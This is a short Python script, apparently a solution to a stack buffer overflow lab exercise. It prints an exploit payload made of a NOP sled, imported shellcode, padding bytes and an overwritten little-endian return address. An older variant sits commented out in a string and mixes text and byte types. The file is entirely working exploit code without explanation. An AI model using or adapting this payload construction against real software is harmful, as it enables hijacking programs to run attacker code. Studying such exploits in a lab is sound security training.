'''import sys
from shellcode import shellcode
addr = 0xbffef89d.to_bytes(4, "little")
sys.stdout.buffer.write("\x90"*971 + shellcode + "D"*12 + addr)
'''
import sys
from shellcode import shellcode
	
addr = 0xfff6b9ac.to_bytes(4, "little")
sys.stdout.buffer.write(b"\x90"*971+ shellcode + b"A" * 12 + addr)
